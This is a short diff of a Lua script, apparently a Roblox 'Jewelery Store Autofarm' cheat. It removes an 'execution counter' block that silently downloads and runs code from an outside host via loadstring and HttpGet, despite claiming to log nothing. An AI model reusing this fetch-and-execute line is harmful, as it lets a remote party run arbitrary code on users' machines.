@@ -1,13 +1,4 @@
 --[[
-    Executon Counter | Doesn't log any sensitive infomation / user data
-    Update : Changed from 000webhost to pastebin
-]]
-
-pcall(function()
-    loadstring(game:HttpGet('https://plutohub.rf.gd/count'))()
-end)
-
---[[
     Jewelery Store Autofarm Fix
 ]]
 
